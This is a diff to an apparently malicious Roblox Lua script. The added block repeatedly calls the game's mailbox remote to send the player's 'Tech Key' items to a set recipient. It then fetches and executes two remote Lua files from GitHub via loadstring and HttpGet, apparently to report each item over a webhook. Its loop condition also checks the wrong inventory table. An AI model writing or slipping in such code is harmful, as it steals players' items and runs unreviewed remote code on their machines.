@@ -385,6 +385,28 @@ for i, v in pairs(inv.Enchant) do
     end
 end
 
+for i, v in pairs(inv.Misc) do
+    local id = v.id
+    if id == "Tech Key" or id == "Tech Key Upper Half" then
+        local args = {
+            [1] = user,
+            [2] = message,
+            [3] = "Misc",
+            [4] = i,
+            [5] = v._am or 1
+        }
+	    repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    until not inv.Enchant[i]
+        directory = library.Directory.MiscItems[id]
+        _G.type = "Not a Pet"
+        _G.image = directory.Icon
+        wait(0.5)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
+        _G.id = id
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
+    end
+end
 
 if inv.Lootbox then
     for i, v in pairs(inv.Lootbox) do
